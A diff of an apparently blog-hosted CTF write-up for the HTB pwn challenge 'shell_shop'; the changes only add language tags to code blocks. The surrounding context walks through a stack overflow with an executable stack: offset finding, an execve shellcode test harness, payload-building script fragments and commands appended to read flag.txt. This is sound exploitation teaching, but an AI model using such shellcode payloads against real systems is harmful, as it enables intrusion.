@@ -9,7 +9,7 @@ categories: [CTF, HTB, Pwn]
 
 The challenge comes in the form of an ELF 64-bit binary:
 
-```
+```bash
 $ file shell_shop          
 shell_shop: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=e3cfb5e3f0b9d17007ce3d49e3ad687365d7c38b, for GNU/Linux 3.2.0, not stripped
 ```
@@ -19,7 +19,7 @@ When run, we’re presented with the following interface:
 
 The decompiled applications reveals its internals in Ghidra (interesting variable names have been changed for a quicker understanding):
 
-```
+```c
 undefined8 main(void)
 
 {
@@ -92,7 +92,7 @@ We can verify the security controls built into the app quickly using [GEF](https
 
 Other ways to confirm that the stack is indeed executable are via the [vmmap](https://gef-legacy.readthedocs.io/en/latest/commands/vmmap/) command: 
 
-```
+```bash
 (gdb) vmmap
 ...
 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rwx [stack]
@@ -100,7 +100,7 @@ Other ways to confirm that the stack is indeed executable are via the [vmmap](ht
 
 Or using the well-known [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) tool, already present on Kali:
 
-```
+```bash
 $ readelf -a ./shell_shop | grep GNU_STACK -A 1
   GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                  0x0000000000000000 0x0000000000000000  RWE 0x10
@@ -116,7 +116,7 @@ What do we have so far:
 
 To exploit the app, we first need to find out the position in the 100-bytes buffer where RBP is being overwritten. To do that, first we’ll generate a pattern with GEF and then get the offset of the RBP after the crash inside that buffer:
 
-```
+```bash
 gef➤  pattern create 100
 [+] Generating a pattern of 100 bytes (n=8)
 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
@@ -128,7 +128,7 @@ aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaa
 
 We can get the position in the buffer which overwrites the RBP register:
 
-```
+```bash
 gef➤  pattern search aaaaaaha
 [+] Searching for '6168616161616161'/'6161616161616861' with period=8
 [+] Found at offset 55 (little-endian search) likely
@@ -136,7 +136,7 @@ gef➤  pattern search aaaaaaha
 
 While debugging, it’s also handy to set up breakpoints at key locations in our application, like for example towards the end after the RBP has been overwritten, to validate that our payload has been transmitted correctly:
 
-```
+```bash
 gef➤   b *(main+372)
 Breakpoint 1 at 0x555555555603
 ```
@@ -146,7 +146,7 @@ Breakpoint 1 at 0x555555555603
 
 As a general observation, for a binary expecting user input we can craft it separately as needed, then feed that to the binary either via command line, or inside the debugger, using the `stdin` redirection operator:
 
-```
+```bash
 gef➤  run < payload
 Starting program: /mnt/hgfs/CTF-oct-23/pwn_shell_shop/shell_shop < payload
 ```
@@ -161,7 +161,7 @@ The strategy for exploitation will be as follows:
 
 Before getting started, we’d need to find a short  Linux x86_64 [execve](https://man7.org/linux/man-pages/man2/execve.2.html) shellcode. Luckily with a quick online search we can find a few that match our conditions, with sizes ranging from 22-24 bytes. Very handy. Once we found one (for example [this one](https://www.exploit-db.com/exploits/46907)), we should test it to make sure it works as expected.
 
-```
+```c
 // gcc -fno-stack-protector -z execstack test_shellcode.c -o test_shellcode
 
 #include <stdio.h>
@@ -186,7 +186,7 @@ When using the above testing harness, remember to compile it with the [execstack
 
 The following Python script creates a local payload file, that we will feed to the app via GDB:
 
-```
+```python
 import sys
 import struct
 
@@ -230,7 +230,7 @@ Notice the value of RSP and RIP registers. The push instruction will corrupt the
 
 When porting our code to `pwntools`, we should provide the correct maximum amount of bytes expected by the `fgets` function call. Otherwise it will hang waiting for more input. So simply append a trailer of NOPs at the end:
 
-```
+```python
 buf += b'\x42' * (100 - len(buf))  # 100 bytes being read (fgets is waiting ..)
 ```
 
@@ -238,7 +238,7 @@ buf += b'\x42' * (100 - len(buf))  # 100 bytes being read (fgets is waiting ..)
 
 We have all the pieces in place, let’s test the shellcode in GDB/GEF:
 
-```
+```bash
 gef➤  r < payload
 ...
 process 2894588 is executing new program: /usr/bin/dash
@@ -251,7 +251,7 @@ The process executes `/usr/bin/dash`, but no interactive shell is being spawned,
 
 It turns out that the same thing would happen outside GDB as well, and the issue is that the input for our program is redirected, and after spawning the shell, there’s no input and the program simply terminates. The fix to read the flag is straightforward: add a few commands at the end of our buffer that will be executed inside the shell:
 
-```
+```python
 # Execute some commands in the shell
 cmds = b'\x0apwd\x0als -al\x0acat flag.txt'
 
@@ -260,7 +260,7 @@ payload = shop + buf + cmds
 
 Now we can execute commands before the shell exits:
 
-```
+```bash
 process 2905441 is executing new program: /usr/bin/dash                                                      
 [Thread debugging using libthread_db enabled]                                                                
 Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".                                   
@@ -278,7 +278,7 @@ HTB{f4k3_fl4g_4_t35t1ng}
 
 Since we got this working inside GDB, let’s port this to `pwntools` to be able to test it remotely as well. The final exploitation script looks as follows:
 
-```
+```python
 from pwn import *
 
 bin_path = './shell_shop'
